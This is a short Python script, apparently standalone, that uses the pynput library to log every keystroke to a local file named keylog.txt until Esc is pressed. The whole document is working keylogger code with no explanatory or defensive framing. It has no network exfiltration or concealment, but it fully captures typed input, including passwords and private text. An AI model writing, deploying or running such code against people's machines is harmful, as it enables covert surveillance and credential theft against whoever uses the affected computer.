from pynput import keyboard

# Path to the log file
log_file = "./keylog.txt"

def on_press(key):
    try:
        with open(log_file, "a") as file:
            file.write(f'{key.char}')
    except AttributeError:
        with open(log_file, "a") as file:
            if key == key.space:
                file.write(' ')
            else:
                file.write(f' {str(key)} ')

def on_release(key):
    if key == keyboard.Key.esc:
        # Stop listener
        return False

# Setup the listener
with keyboard.Listener(
        on_press=on_press,
        on_release=on_release) as listener:
    listener.join()
